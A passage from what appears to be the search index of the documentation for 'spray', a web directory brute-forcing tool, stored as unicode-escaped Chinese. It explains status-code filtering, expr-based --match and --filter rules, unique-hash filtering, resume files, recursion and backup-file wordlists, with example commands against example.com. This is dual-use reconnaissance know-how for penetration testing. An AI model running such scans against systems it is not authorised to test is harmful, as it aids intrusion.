\u662f\u65e0\u6cd5\u5728\u57fa\u672c\u4fe1\u606f\u63a2\u6d4b\u65f6\u4f7f\u7528, \u56e0\u4e3a\u9700\u8981\u57fa\u51c6\u503c\u53bb\u8fc7\u6ee4\u722c\u866b\u7684\u7ed3\u679c. \u4f46\u662f\u53ef\u4ee5\u53ea\u5bf9\u5f53\u524d\u9875\u9762\u505a\u4fe1\u606f\u6536\u96c6.  <code>--extract url,js</code> \u5373\u53ef\u6253\u5f00\u722c\u866b\u5bf9\u5e94\u7684\u63d0\u53d6\u5668, \u6536\u96c6url\u4f46\u4e0d\u8fdb\u884c\u9012\u5f52\u722c\u53d6</p> <p>\u6ce8\u610f</p> <p>crawl \u7684\u7ed3\u679c\u6ca1\u6709\u50cf jsfinder \u4e2d\u4e00\u6837\u62fc\u63a5\u4e0a baseurl, \u56e0\u4e3a\u4ece js \u4e2d\u63d0\u53d6\u51fa\u6765\u7684\u7ed3\u679c\u901a\u5e38\u4e0d\u662f\u6700\u7ec8\u7684\u7ed3\u679c, \u76f4\u63a5\u53bb\u8bbf\u95ee\u5927\u6982\u7387\u662f 404. \u4e3a\u4e86\u9632\u6b62\u9020\u6210\u6df7\u6dc6, spray \u7684 crawl \u7ed3\u679c\u5c06\u4fdd\u6301\u539f\u6837\u8f93\u51fa. \u4f46\u5728\u722c\u866b\u9012\u5f52\u65f6, \u8fd8\u662f\u4f1a\u5c1d\u8bd5\u62fc\u63a5\u4e0a baseurl \u8fdb\u884c\u63a2\u6d4b. \u722c\u866b\u9012\u5f52\u65f6\u4f1a\u8fdb\u884c\u81ea\u52a8\u53bb\u91cd\u5224\u65ad.</p>"},{"location":"spray/start/#active","title":"active","text":"<p>\u4ec5brute\u53ef\u7528</p> <ul> <li><code>--active</code> \u53ef\u4ee5\u5f00\u542f\u7c7b\u4f3cgogo \u7684\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b, \u5e76\u4e14\u6dfb\u52a0<code>append</code>\u4e3b\u52a8\u6307\u7eb9\u5b57\u5178</li> </ul>"},{"location":"spray/start/#bak","title":"bak","text":"<p>\u4ec5brute\u53ef\u7528</p> <ul> <li><code>--bak</code> \u4f1a\u6784\u9020\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6\u5b57\u5178, \u5305\u542bfuzzuli\u4e2d\u7684 regular \u89c4\u5219, \u81ea\u52a8\u6784\u9020\u5907\u4efd\u6587\u4ef6\u5b57\u5178,  \u5e76\u4e14\u6dfb\u52a0<code>append</code>\u5907\u4efd\u6587\u4ef6\u5b57\u5178</li> </ul>"},{"location":"spray/start/#common","title":"common","text":"<p>\u4ec5brute\u53ef\u7528</p> <ul> <li><code>--common</code> \u4e00\u4e9b web \u7684\u5e38\u89c1\u901a\u7528\u6587\u4ef6\u5b57\u5178\u4e0e\u901a\u7528\u65e5\u5fd7\u6587\u4ef6\u5b57\u5178, \u5e76\u5c06\u8fd9\u4e24\u4e2a\u5b57\u5178\u52a0\u5230<code>append</code></li> </ul> <p>\u5982\u679c\u542f\u7528\u4e86\u4ec5brute\u53ef\u7528\u7684\u63d2\u4ef6, \u4f1a\u81ea\u52a8\u8f6c\u4e3abrute\u6a21\u5f0f</p> <p>\u6709\u4efb\u4f55\u7c7b\u4f3c\u7684\u901a\u7528 fuzz \u624b\u6cd5, \u6b22\u8fce\u63d0\u4f9b issue.</p>"},{"location":"spray/start/#advance-feature","title":"Advance Feature","text":""},{"location":"spray/start/#\u81ea\u5b9a\u4e49\u667a\u80fd\u8fc7\u6ee4","title":"\u81ea\u5b9a\u4e49\u667a\u80fd\u8fc7\u6ee4","text":"<p>\u667a\u80fd\u8fc7\u6ee4\u7684\u903b\u8f91\u5f88\u96be\u7528\u51e0\u884c\u6587\u5b57\u63cf\u8ff0, \u53ef\u4ee5\u89c1\u667a\u80fd\u8fc7\u6ee4\u903b\u8f91</p> <p>\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u72b6\u6001\u7801\u5217\u8868\u81ea\u5b9a\u4e49\u4e00\u90e8\u5206\u7684\u667a\u80fd\u8fc7\u6ee4\u903b\u8f91.</p> <ul> <li><code>--black-status</code> \u8fd9\u4e2a\u5217\u8868\u5185\u7684\u72b6\u6001\u7801\u5c06\u88ab\u76f4\u63a5\u8fc7\u6ee4, \u9ed8\u8ba4 400, 410</li> <li><code>--white-status</code> \u8fd9\u4e2a\u5217\u8868\u5185\u7684\u72b6\u6001\u7801\u5c06\u8fdb\u5165\u5230\u6807\u51c6\u7684\u667a\u80fd\u8fc7\u6ee4\u903b\u8f91, \u9ed8\u8ba4 200</li> <li><code>--fuzzy-status</code>\u8fd9\u4e2a\u5217\u8868\u5185\u7684\u72b6\u6001\u7801\u624d\u6709\u8d44\u683c\u8fdb\u5165\u5230\u6a21\u7cca\u8fc7\u6ee4\u7684\u903b\u8f91, \u9ed8\u8ba4 403, 404, 500, 501, 502, 503</li> <li><code>--waf-status</code> \u8fd9\u4e2a\u5217\u8868\u7684\u72b6\u6001\u7801\u4e0e<code>black-status</code>\u7c7b\u4f3c, \u4f46\u4f1a\u6807\u8bb0\u4e3a\u88ab waf, \u9ed8\u8ba4 493, 418</li> </ul> <p>\u76f4\u63a5\u4f7f\u7528\u4f8b\u5982<code>--black-status 1020</code>\u5c06\u4f1a\u8986\u76d6\u539f\u6709\u7684\u503c, \u53ef\u4ee5\u4f7f\u7528<code>--black-status +1020</code>\u5728\u539f\u6709\u7684\u57fa\u7840\u4e0a\u65b0\u589e, \u6216<code>--black-status !1024</code> \u5728\u539f\u6709\u7684\u57fa\u7840\u4e0a\u53bb\u9664.</p> <p>fuzzy all</p> <p><code>--fuzzy-status</code>\u53c2\u6570\u5b58\u5728\u7279\u4f8b<code>--fuzzy-status all</code> \u542f\u7528\u6240\u6709\u72b6\u6001\u7801\u7684 fuzzy \u8fc7\u6ee4, \u7528\u6765\u5e94\u5bf9\u4e00\u4e9b\u7279\u6b8a\u573a\u666f</p>"},{"location":"spray/start/#\u81ea\u5b9a\u4e49\u8868\u8fbe\u5f0f\u8fc7\u6ee4","title":"\u81ea\u5b9a\u4e49\u8868\u8fbe\u5f0f\u8fc7\u6ee4","text":"<p>\u667a\u80fd\u8fc7\u6ee4\u80fd\u6700\u5927\u7a0b\u5ea6\u4fdd\u7559 spray \u5185\u7f6e\u7684\u8fc7\u6ee4\u7b56\u7565. \u4f46\u67d0\u4e9b\u60c5\u51b5\u4e0b, spray \u5185\u7f6e\u7684\u7b56\u7565\u4e5f\u4e0d\u80fd\u6ee1\u8db3\u9700\u6c42, \u5c31\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\u4ee3\u66ff spray \u5185\u7f6e\u7684\u7b56\u7565.</p> <p>\u67d0\u4e9b\u60c5\u51b5\u53ef\u80fd\u975e\u5e38\u79bb\u8c31, \u6bd4\u5982 not found \u9875\u9762\u8fd4\u56de 200, \u5e76\u4e14\u6bcf\u6b21 body \u76f8\u4f3c\u5ea6\u90fd\u4e0d\u9ad8. \u8fd9\u79cd\u60c5\u51b5\u4e0b, \u5c31\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u529f\u80fd.</p> <p>spray \u4e2d\u4f7f\u7528\u4e86 expr \u4f5c\u4e3a\u8868\u8fbe\u5f0f\u8bed\u8a00, \u5e94\u8be5\u662f\u5e02\u9762\u4e0a\u516c\u5f00\u7684\u6027\u80fd\u6700\u5f3a\u7684\u811a\u672c\u8bed\u8a00\u4e86.</p> <p>expr \u7684\u8bed\u6cd5\u4ecb\u7ecd: https://expr.medv.io/docs/Language-Definition</p> <p>expr \u8bed\u6cd5\u548c xray/github action \u4e2d\u5dee\u4e0d\u591a, spray \u4e2d\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e5f\u7528\u4e0d\u5230\u9ad8\u7ea7\u529f\u80fd. \u53ea\u9700\u8981\u4e86\u89e3\u6700\u7b80\u5355\u7684\u7b49\u4e8e/\u5305\u542b\u4e4b\u7c7b\u5224\u65ad\u5373\u53ef.</p>"},{"location":"spray/start/#custom-match","title":"custom match","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528--match \u5b9a\u4e49\u6211\u4eec\u9700\u8981\u7684\u8fc7\u6ee4\u89c4\u5219, --match \u81ea\u5b9a\u4e49\u7684\u8fc7\u6ee4\u51fd\u6570\u5c06\u4f1a\u66ff\u6362\u6389\u9ed8\u8ba4\u7684\u667a\u80fd\u8fc7\u6ee4. \u4e5f\u5c31\u662f\u8bf4, \u5f00\u542f\u4e86--match, \u667a\u80fd\u8fc7\u6ee4\u5c31\u81ea\u52a8\u5173\u95ed\u4e86, \u5982\u679c\u4e0d\u60f3\u5173\u95ed\u667a\u80fd\u8fc7\u6ee4, \u4e5f\u63d0\u4f9b\u4e86\u5176\u4ed6\u89e3\u51b3\u529e\u6cd5.</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50, \u5047\u8bbe\u67d0\u4e2a\u7f51\u7ad9\u6240\u6709\u7684 404 \u9875\u9762\u90fd\u6307\u5411\u516c\u76ca\u9875\u9762, \u6211\u4eec\u60f3\u53bb\u6389\u6240\u6709\u7684\u5e26\"\u516c\u76ca\"\u5b57\u6837\u7684\u9875\u9762:</p> <pre><code>spray -u http://example.com -d word1.txt --match 'current.Body not contains \"\u516c\u76ca\"'\n</code></pre> <p>\u8fd9\u91cc\u7684 current \u5173\u952e\u5b57\u8868\u793a\u5f53\u524d\u7684\u8bf7\u6c42\u7684 baseline. <code>current.Body</code>\u5373\u4e3a baseline \u7ed3\u6784\u4f53\u4e2d\u7684 Body \u5b57\u6bb5, baseline \u7ed3\u6784\u4f53\u53ef\u4ee5\u89c1 https://chainreactors.github.io/wiki/spray/detail/#baseline .</p> <p>spray \u83b7\u53d6\u7684 baseline \u4e5f\u4f1a\u88ab\u6ce8\u518c\u5230\u5c06\u672c\u8bed\u8a00\u4e2d. <code>index</code> \u8868\u793a <code>index_baseline</code>, <code>random</code> \u8868\u793a <code>random_baseline</code>, <code>403bl</code> \u8868\u793a\u5982\u679c\u7b2c\u4e00\u4e2a\u83b7\u53d6\u7684\u72b6\u6001\u7801\u4e3a 403 \u7684\u8bf7\u6c42. \u5982\u679c\u4e4b\u524d\u6ca1\u6709 403, \u5219\u6240\u6709\u5b57\u6bb5\u4e3a\u7a7a.</p>"},{"location":"spray/start/#custom-filter","title":"custom filter","text":"<p>\u5982\u679c\u5339\u914d\u7684\u7ed3\u679c\u4f9d\u65e7\u4e0d\u6ee1\u610f, \u53ef\u4ee5\u52a0\u4e0a<code>--filter</code> \u5bf9 match \u7684\u7ed3\u679c\u8fdb\u884c\u4e8c\u6b21\u8fc7\u6ee4, <code>--filter</code>\u7684\u89c4\u5219\u4e0e <code>--match</code> \u4e00\u81f4.</p> <p>\u5982\u679c\u6ca1\u6709\u81ea\u5b9a\u4e49<code>--match</code> , <code>--filter</code>\u5c06\u4f1a\u5bf9\u667a\u80fd\u8fc7\u6ee4\u7684\u7ed3\u679c\u8fdb\u884c\u4e8c\u6b21\u8fc7\u6ee4.</p> <p>\u67d0\u4e2a\u7f51\u7ad9\u5b58\u5728\u901a\u914d\u7b26\u76ee\u5f55\u4e0b\u8fd4\u56de 405, \u4e14 405 \u4e2d\u5b58\u5728\u4e00\u5b9a\u7684\u968f\u673a\u503c, \u667a\u80fd\u8fc7\u6ee4\u7684\u89c4\u5219\u88ab\u6253\u7834, \u51fa\u73b0\u4e86\u51e0\u5343\u4e2a 405 \u72b6\u6001\u7801\u7684\u6709\u6548\u7ed3\u679c. \u8fd9\u4e2a\u65f6\u5019\u5c31\u53ef\u4ee5\u4f7f\u7528<code>--filter</code>\u53bb\u4e8c\u6b21\u8fc7\u6ee4\u667a\u80fd\u8fc7\u6ee4\u7684\u7ed3\u679c.</p> <pre><code>spray -u http://example.com -d word1.txt --filter 'current.Status != 405'\n</code></pre> <p>--match \u4f1a\u8986\u76d6\u667a\u80fd\u8fc7\u6ee4</p> <p><code>--match</code>\u4e0e\u9ed8\u8ba4\u7684\u667a\u80fd\u8fc7\u6ee4\u5904\u4e8e\u540c\u4e00\u4e2a\u9636\u6bb5, \u5982\u679c\u624b\u52a8\u6307\u5b9a\u4e86<code>--match</code>\u5219\u4f1a\u5173\u95ed\u667a\u80fd\u8fc7\u6ee4\u91c7\u7528\u7528\u6237\u6307\u5b9a\u7684\u89c4\u5219. <code>--filter</code> \u53ef\u4ee5\u4e0e\u667a\u80fd\u8fc7\u6ee4\u540c\u65f6\u751f\u6548, <code>--match</code>/\u667a\u80fd\u8fc7\u6ee4 \u540e\u7684\u7ed3\u679c\u5c06\u4f1a\u9001\u5165<code>--filter</code> \u4e2d\u8fdb\u884c\u4e8c\u6b21\u8fc7\u6ee4</p> <pre><code>flowchart TD\n    A(precompare, \u8fc7\u6ee4\u6389\u4e00\u5b9a\u65e0\u7528\u7684\u6570\u636e) --&gt; B(\u667a\u80fd\u8fc7\u6ee4/custom match)\n    B --&gt; C(custom filter)</code></pre>"},{"location":"spray/start/#\u624b\u52a8\u914d\u7f6e\u8fc7\u6ee4\u5668","title":"\u624b\u52a8\u914d\u7f6e\u8fc7\u6ee4\u5668","text":"<p>\u5047\u8bbe\u4e00\u4e2a\u529f\u80fd\u4e3a api \u7684\u7ad9\u70b9\uff0c \u4ed6\u901a\u8fc7\u5168\u5c40\u7684\u9519\u8bef\u5904\u7406\u5c06\u8fd4\u56de\u503c\u7edf\u4e00\u6539\u6210 200/405.</p> <p>\u5728 spray \u4e2d, 200 \u662f\u767d\u540d\u5355\u72b6\u6001\u7801, \u4f1a\u8df3\u8fc7 precompare, \u76f4\u63a5\u5230\u667a\u80fd\u8fc7\u6ee4\u7684\u7b2c\u4e8c\u6b65, \u5f00\u59cb\u5185\u5bb9\u7684\u5339\u914d. \u5982\u679c\u5185\u5b58\u4e2d\u5b58\u5728\u4f8b\u5982\u65f6\u95f4\u6233\u4e4b\u7c7b\u7684\u968f\u673a\u6570, \u8fd8\u4f1a\u5230\u7b2c\u4e09\u6b65\u6a21\u7cca\u8fc7\u6ee4.</p> <p>\u800c 405 \u72b6\u6001\u7801\u5219\u8f93\u51fa\u6ca1\u6709\u4efb\u4f55\u914d\u7f6e\u7684\u72b6\u6001\u7801, \u8fd4\u56de\u7ed3\u679c\u5927\u6982\u7387\u4f1a\u80fd\u5230\u6a21\u7cca\u8fc7\u6ee4\u4e2d, \u5982\u679c 405 \u4e0e 200 \u5dee\u5f02\u8f83\u5c0f. \u8fd9\u79cd\u60c5\u51b5\u4e0b\u5c31\u9700\u8981\u624b\u52a8\u4fee\u6539\u8fc7\u6ee4\u89c4\u5219\u4e86.</p> <p>spray \u4e2d\u4fee\u6539\u8fc7\u6ee4\u89c4\u5219\u6709\u5f88\u591a\u4e2d\u65b9\u5f0f, \u4ee5\u8fd9\u4e2a\u4f8b\u5b50\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u4e0d\u540c\u65b9\u5f0f\u4e4b\u95f4\u7684\u5dee\u5f02.</p> <p>\u65b9\u6cd5 1: \u6dfb\u52a0\u53c2\u6570<code>--black-status 405</code></p> <p>\u8fd9\u79cd\u65b9\u5f0f\u8f83\u4e3a\u66b4\u529b, \u4f1a\u5728 precompare \u9636\u6bb5\u76f4\u63a5\u8fc7\u6ee4\u6389, \u8df3\u8fc7\u540e\u7eed\u7684\u9636\u6bb5.</p> <p>\u5efa\u8bae\u660e\u786e\u77e5\u9053 405 \u72b6\u6001\u7801\u4e3a\u65e0\u6548\u9875\u9762\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528. \u679c 405 \u9875\u9762\u7684\u4f9d\u65e7\u6709\u53ef\u80fd\u5b58\u5728\u6709\u4ef7\u503c\u7684\u4fe1\u606f, \u5219\u4e0d\u63a8\u8350\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f.</p> <p>\u65b9\u6cd5 2: \u6dfb\u52a0\u53c2\u6570<code>--fuzzy-status 405</code></p> <p>405 \u914d\u7f6e\u5230 fuzzy-status \u72b6\u6001\u7801\u5217\u8868\u4e2d, \u6bcf\u6b21\u9047\u5230 405 \u8bf7\u6c42, \u90fd\u4f1a\u4e0e 405baseline \u8fdb\u884c\u5bf9\u6bd4.</p> <p>\u8fd9\u79cd\u65b9\u6cd5\u662f\u6bd4\u8f83\u63a8\u8350\u7684, \u5b83\u53ea\u4f1a\u5fae\u8c03\u667a\u80fd\u8fc7\u6ee4\u7684\u903b\u8f91, \u968f\u673a\u76ee\u5f55\u7684 405 \u72b6\u6001\u7801\u5c06\u4f1a\u52a0\u5165\u5230\u57fa\u7ebf\u4e2d, \u5982\u679c\u5176\u4ed6\u8bf7\u6c42\u4e5f\u9047\u5230\u4e86\u51e0\u4e4e\u76f8\u540c\u7684 405 \u9875\u9762, \u5219\u53ef\u4ee5\u8ba4\u4e3a\u662f\u65e0\u6548\u6570\u636e\u8fc7\u6ee4\u6389.</p> <p>\u53ef\u4ee5\u4fdd\u7559\u667a\u80fd\u8fc7\u6ee4\u7684\u5168\u90e8\u529f\u80fd, \u5e76\u4e14\u4e0d\u4f1a\u6709\u989d\u5916\u7684\u6027\u80fd\u635f\u8017.</p> <p>\u65b9\u6cd5 3: \u4f7f\u7528\u8868\u8fbe\u5f0f\u5339\u914d<code>--match 'current.Status != 405'</code></p> <p>\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u8868\u793a, \u6240\u6709\u72b6\u6001\u7801\u4e0d\u7b49\u4e8e 405 \u7684\u9875\u9762\u90fd\u4f1a\u8f93\u51fa. \u6709\u4e9b\u7c7b\u4f3c\u65b9\u6cd5 1 \u4e2d\u7684 black-status, \u4f46\u662f\u65b9\u6cd5 1 \u5e76\u4e0d\u4f1a\u5bf9\u5176\u4ed6\u667a\u80fd\u8fc7\u6ee4\u7684\u89c4\u5219\u505a\u51fa\u4fee\u6539.</p> <p>--match \u5c06\u4f1a\u91cd\u8f7d\u9ed8\u8ba4\u7684\u667a\u80fd\u8fc7\u6ee4\u7684\u5168\u90e8\u903b\u8f91. \u4e5f\u5c31\u662f\u8bf4, \u667a\u80fd\u8fc7\u6ee4\u7684 123 \u9636\u6bb5\u90fd\u4f1a\u8df3\u8fc7, \u53d6\u800c\u4ee3\u4e4b\u7684\u662f\u8fd9\u4e2a\u8868\u8fbe\u5f0f.</p> <p>\u8868\u8fbe\u5f0f\u7684\u6027\u80fd\u5e76\u4e0d\u597d, \u5e76\u4e14\u914d\u7f6e\u8d77\u6765\u4e5f\u8f83\u4e3a\u9ebb\u70e6, \u4e0d\u63a8\u8350\u4f7f\u7528.</p> <p>\u65b9\u6cd5 4: \u4f7f\u7528\u8868\u8fbe\u5f0f\u8fc7\u6ee4<code>--filter 'current.Status == 405'</code></p> <p>filter \u4e00\u822c\u6765\u8bf4\u662f\u6bd4 match \u7684\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u9009\u62e9.</p> <p>--filter \u4e0e--match \u7684\u533a\u522b\u5728\u4e8e, --filter \u4f5c\u7528\u4e8e compare(\u5305\u62ec\u667a\u80fd\u8fc7\u6ee4\u4e0e match \u8868\u8fbe\u5f0f\u8fc7\u6ee4)\u7684\u4e0b\u4e00\u9636\u6bb5. \u901a\u8fc7 compare \u7ed3\u679c\u5c06\u4f1a\u7531--filter \u8fdb\u884c\u4e8c\u6b21\u8fc7\u6ee4.</p> <p>\u610f\u5473\u7740, \u5982\u679c\u4ec5\u8bbe\u7f6e\u4e86--filter, \u90a3\u4e48\u667a\u80fd\u8fc7\u6ee4\u4f9d\u65e7\u751f\u6548, \u5e76\u4e14\u53ef\u4ee5\u8fc7\u6ee4\u6389\u72b6\u6001\u7801\u4e3a 405 \u7684\u8bf7\u6c42.</p>"},{"location":"spray/start/#unique-\u8fc7\u6ee4\u5668","title":"unique \u8fc7\u6ee4\u5668","text":"<p>\u914d\u7f6e\u8fd9\u4e9b\u590d\u6742\u7684\u8fc7\u6ee4\u65b9\u5f0f\u6216\u591a\u6216\u5c11\u5b58\u5728\u4e00\u4e9b\u969c\u788d. \u6709\u4e9b\u7f51\u7ad9\u7684\u7279\u4f8b\u751a\u81f3\u591a\u5230\u4e00\u65f6\u534a\u4f1a\u6ca1\u529e\u6cd5\u7f16\u5199\u51fa\u5408\u9002\u7684\u8fc7\u6ee4\u7b56\u7565.</p> <p>\u4e3a\u6b64\u6dfb\u52a0\u4e86\u4e00\u79cd\u65b0\u7684\u8fc7\u6ee4\u5668. \u7531 host+\u72b6\u6001\u7801+\u91cd\u5b9a\u5411 url+content-type+title+length \u820d\u53bb\u4e2a\u4f4d\u4e0e\u5341\u4f4d\u7ec4\u6210\u7684 CRChash, \u5b9e\u73b0\u4e86\u4e00\u4e2a\u7b80\u6613\u7684\u5c3d\u53ef\u80fd\u8986\u76d6\u5927\u591a\u6570\u573a\u666f\u7684\u901a\u7528\u8fc7\u6ee4\u5668.</p> <pre><code>func UniqueHash(bl *Baseline) uint16 {\n    return CRC16Hash([]byte(bl.Host + strconv.Itoa(bl.Status) + bl.RedirectURL + bl.ContentType + bl.Title + strconv.Itoa(bl.BodyLength/100*100)))\n}\n</code></pre> <p><code>spray -u http://example -d 1.txt --unique</code></p> <p>\u5f53\u7136\u4fbf\u6377\u7684\u8fc7\u6ee4\u5668\u4e5f\u4f1a\u5e26\u6765\u4e00\u4e9b\u526f\u4f5c\u7528, \u56e0\u6b64\u6240\u6709\u88ab unique \u8fc7\u6ee4\u7684\u7ed3\u679c\u90fd\u4f1a\u8fdb\u5165\u5230 fuzzy \u8f93\u51fa\u6d41\u4e2d.</p> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>--unique-status 200</code> \u6307\u5b9a\u7279\u5b9a\u72b6\u6001\u7801\u624d\u542f\u7528 unique \u8fc7\u6ee4\u5668</p>"},{"location":"spray/start/#\u65ad\u70b9\u7eed\u4f20","title":"\u65ad\u70b9\u7eed\u4f20","text":"<p>spray \u652f\u6301\u65ad\u70b9\u7eed\u4f20, \u53ef\u4ee5\u901a\u8fc7<code>--resume</code>\u53c2\u6570\u6307\u5b9a\u65ad\u70b9\u6587\u4ef6. \u901a\u8fc7\u65ad\u70b9\u6587\u4ef6\u4e2d\u8bb0\u5f55\u7684\u6570\u636e\u6062\u590d\u8fdb\u5ea6.</p> <p>\u4e3a\u4e86\u66f4\u597d\u7684\u652f\u6301\u65ad\u70b9\u7eed\u4f20, spray \u76d1\u542c\u4e86 ctrl+c \u4fe1\u53f7, \u5982\u679c\u901a\u8fc7 ctrl+c \u53d6\u6d88\u4efb\u52a1, \u6240\u6709\u4efb\u52a1(\u5305\u62ec\u5df2\u5b8c\u6210\u4e0e\u6ca1\u5b8c\u6210)\u7684\u6570\u636e\u90fd\u4f1a\u4fdd\u5b58\u5230 stat \u7ed3\u5c3e\u7684\u6587\u4ef6\u4e2d.</p> <p>\u6240\u4ee5\u5efa\u8bae\u975e\u5fc5\u8981\u60c5\u51b5\u4e0d\u8981\u4f7f\u7528 kill -9 \u7ed3\u675f spray \u8fdb\u7a0b.</p> <p>\u53e6\u5916, \u5982\u679c\u4f7f\u7528<code>--resume</code>\u4f9d\u65e7\u6ca1\u6709\u5b8c\u6210\u4efb\u52a1, \u53ea\u8981\u662f\u6b63\u5e38\u7684\u9000\u51fa\u4fe1\u53f7, \u90fd\u4f1a\u91cd\u5199\u5f53\u524d\u7684 stat \u6587\u4ef6, \u4ee5\u66f4\u65b0\u8fdb\u5ea6\u5230\u5f53\u524d\u626b\u63cf, \u968f\u65f6\u53ef\u4ee5\u518d\u6b21\u8bfb\u53d6 stat \u6587\u4ef6\u7ee7\u7eed\u626b\u63cf\u4efb\u52a1.</p> <p>\u65ad\u70b9\u7eed\u4f20\u652f\u6301\u6bd4\u547d\u4ee4\u884c\u66f4\u81ea\u7531\u7684\u5b57\u5178\u914d\u7f6e. \u6bcf\u4e2a\u4efb\u52a1\u90fd\u53ef\u4ee5\u62e5\u6709\u72ec\u7acb\u7684-w/-r/-d \u914d\u7f6e. \u56e0\u6b64\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\u4e0b\u8981\u8fdb\u884c\u6279\u91cf\u64cd\u4f5c, \u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u53bb\u6784\u9020\u5bf9\u5e94\u7684 stat \u6587\u4ef6, \u5b9e\u73b0\u66f4\u52a0\u81ea\u7531\u7684\u4efb\u52a1\u914d\u7f6e.</p>"},{"location":"spray/start/#\u9012\u5f52","title":"\u9012\u5f52","text":"<p>spray \u5e76\u4e0d\u9f13\u52b1\u4f7f\u7528\u9012\u5f52, \u56e0\u4e3a spray \u7684\u5b9a\u4f4d\u662f\u6279\u91cf\u4ece\u53cd\u4ee3/cdn \u4e2d\u53d1\u73b0\u9690\u5f62\u8d44\u4ea7. \u4e0d\u7ba1\u662f\u56e0\u4e3a\u6279\u91cf, \u8fd8\u662f\u56e0\u4e3a\u53cd\u4ee3/cdn, \u7edd\u5927\u591a\u6570\u7684\u60c5\u51b5\u90fd\u7528\u4e0d\u5230\u9012\u5f52. \u5efa\u8bae\u4f7f\u7528\u8f7b\u91cf\u7ea7\u9012\u5f52\u4ee3\u66ff\u9012\u5f52</p> <p>\u4f46\u4e3a\u4e86\u517c\u5bb9\u67d0\u4e9b\u6781\u4e3a\u7f55\u89c1\u7684\u60c5\u51b5, spray \u4f9d\u65e7\u4fdd\u7559\u4e86\u9012\u5f52\u7684\u529f\u80fd.</p> <p>\u9ed8\u8ba4\u9012\u5f52\u4e3a\u5173\u95ed\u72b6\u6001, \u53ef\u4ee5\u4f7f\u7528<code>--depth 2</code>\u9009\u62e9\u9012\u5f52\u6df1\u5ea6\u5f00\u542f\u9012\u5f52\u6a21\u5f0f.</p> <p>\u9ed8\u8ba4\u7684\u9012\u5f52\u89c4\u5219\u4e3a<code>current.IsDir()</code>, \u5373\u6240\u6709\u7684\u76ee\u5f55(\u7ed3\u5c3e\u4e3a/\u7684\u7ed3\u679c)\u90fd\u4f1a\u88ab\u9012\u5f52.</p> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>--recursive</code>\u624b\u52a8\u9009\u62e9\u9012\u5f52\u89c4\u5219, \u89c4\u5219\u4e0e<code>filter/match</code>\u76f8\u540c\u7684 expr \u8868\u8fbe\u5f0f . \u4f8b\u5982<code>--recursive current.IsDir() &amp;&amp; current.Status == 403</code>\u8868\u793a, \u9012\u5f52\u6240\u6709\u72b6\u6001\u7801\u4e3a 403 \u7684\u6709\u6548\u76ee\u5f55.</p>"},{"location":"spray/start/#\u8f7b\u91cf\u7ea7\u9012\u5f52","title":"\u8f7b\u91cf\u7ea7\u9012\u5f52","text":"<p>\u5f88\u591a\u65f6\u5019\u626b\u5230\u4e86\u6709\u6548\u76ee\u5f55, \u4f46\u5982\u4f55\u8fdb\u4e00\u6b65\u6df1\u5165\u5462? \u6700\u7b80\u5355\u7684\u529e\u6cd5\u5c31\u662f\u5168\u91cf\u5b57\u5178\u9012\u5f52, \u4f46\u5b9e\u9645\u4e0a\u8fd9\u6837\u505a\u6548\u7387\u4f4e, \u51c6\u786e\u7387\u4e5f\u4f4e.</p> <p>\u6b63\u786e\u7684\u505a\u6cd5\u662f\u6839\u636e\u573a\u666f\u9009\u62e9\u5408\u9002\u7684\u5b57\u5178\u751f\u6210\u65b9\u5f0f. \u4f8b\u5982\u5982\u679c\u7206\u7834\u5230\u4e86\u65b0\u7684\u76ee\u5f55, \u5219\u81ea\u52a8\u7206\u7834\u5907\u4efd\u6587\u4ef6, \u7206\u7834\u5230\u4e86\u65b0\u7684 api \u5219\u81ea\u52a8\u6d4b\u8bd5\u6743\u9650\u7ed5\u8fc7.</p> <p>\u8f7b\u91cf\u7ea7\u9012\u5f52\u4e0e\u9012\u5f52\u7684\u533a\u522b</p> <p>\u9012\u5f52\u5c06\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684pool, \u4f1a\u5c1d\u8bd5\u91cd\u65b0\u83b7\u53d6\u57fa\u51c6\u503c, \u5e76\u4f7f\u7528<code>-d</code>/<code>-w</code> \u751f\u6210\u7684\u5b57\u5178\u8fdb\u884c\u7206\u7834 \u8f7b\u91cf\u7ea7\u9012\u5f52\u8fd8\u662f\u5728\u5f53\u524d\u4e0a\u4e0b\u6587, \u57fa\u51c6\u503c\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8. \u53ea\u4f1a\u4f7f\u7528<code>--append</code> \u4e0e<code>--append-rule</code>\u7684\u89c4\u5219\u8fdb\u884c\u8fdb\u4e00\u6b65\u7206\u7834</p>"},{"location":"spray/start/#append","title":"append","text":"<p>\u901a\u8fc7<code>--append</code> \u547d\u4ee4\u53ef\u8ffd\u52a0\u8f7b\u91cf\u7ea7\u9012\u5f52\u7684\u5b57\u5178, \u5982\u679c\u53d1\u73b0\u4e86\u6709\u6548\u76ee\u5f55, \u5219\u4f1a\u81ea\u52a8\u4f7f\u7528\u8be5\u5b57\u5178(\u800c\u975e\u5b8c\u6574\u7684\u5b57\u5178\u8fdb\u884c\u9012\u5f52\u7206\u7834). </p> <p><code>spray -u http://example.com --append append.txt --append --custom.txt</code></p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5185\u7f6e\u7684\u76ee\u5f55\u5b57\u5178</p> <p><code>spray -u http://example.com --append common --append iis</code></p>"},{"location":"spray/start/#append-rule","title":"append-rule","text":"<p><code>--append-rule</code> 